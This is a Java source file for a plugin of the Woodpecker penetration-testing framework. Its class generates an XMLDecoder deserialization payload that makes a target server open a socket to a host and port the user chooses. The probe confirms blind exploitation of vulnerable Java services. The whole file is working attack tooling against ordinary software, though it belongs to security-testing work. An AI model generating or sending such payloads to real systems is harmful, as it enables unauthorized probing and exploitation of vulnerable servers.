package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class SocketlogPayloadGenerator implements IHelper {
    public String getHelperTabCaption() {
        return "socket log";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg argHost = XMLDecoderPlugin.pluginHelper.createArg();
        argHost.setName("host");
        argHost.setType(IArg.ARG_TYPE_IP);
        argHost.setDefaultValue("127.0.0.1");
        argHost.setDescription("ip");
        argHost.setRequired(true);
        args.add(argHost);

        IArg argPort = XMLDecoderPlugin.pluginHelper.createArg();
        argPort.setName("port");
        argPort.setDefaultValue("80");
        argPort.setType(IArg.ARG_TYPE_PORT);
        argPort.setDescription("端口");
        argPort.setRequired(true);
        args.add(argPort);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String host = (String)customArgs.get("host");
        int port = Integer.valueOf((String)customArgs.get("port"));

        String payload = String.format("<java>\n" +
                "<object class=\"java.net.Socket\">\n" +
                "    <string>%s</string>\n" +
                "    <int>%d</int>\n" +
                "</object>\n" +
                "</java>",host,port);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
